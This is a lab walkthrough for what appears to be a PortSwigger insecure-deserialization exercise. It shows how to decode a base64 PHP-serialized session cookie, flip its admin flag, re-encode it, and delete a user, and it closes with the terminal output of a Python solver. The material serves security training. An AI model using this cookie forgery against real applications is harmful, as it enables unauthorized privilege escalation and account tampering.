# Lab: Modifying serialized objects

### Instructions

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

Login in with the provided credentials we see a cookie set at login:

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
```

If we URL decode and then base64 decode this cookie we see the following values:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

`"admin";b:0;` is especially interesting and because our user is an unprivileged user we can assume that `b:0` indicates admin false, while `b:1` would indicate admin true.

Let's make that change, then base64 and then URL encode the value:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D
```

This works because the application is not performing any type of checks on the cookie that is set.

Updating this for our `session` cookie and refreshing the page we are now able to access the admin panel to delete the user carlos and solve the lab.

### Python Solution

See `deserialization_01.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Insecure_Deserialization/Deserialization_01_modifying_serialized_objects]
└─$ python deserialization_01.py https://0a6f00db0451230782da742b000100f7.web-security-academy.net/
[+] Logged in as wiener
[+] Original cookie content: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
[+] New cookie content: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
[+] Forged admin cookie
[+] Deleted carlos
[+] Lab solved!
```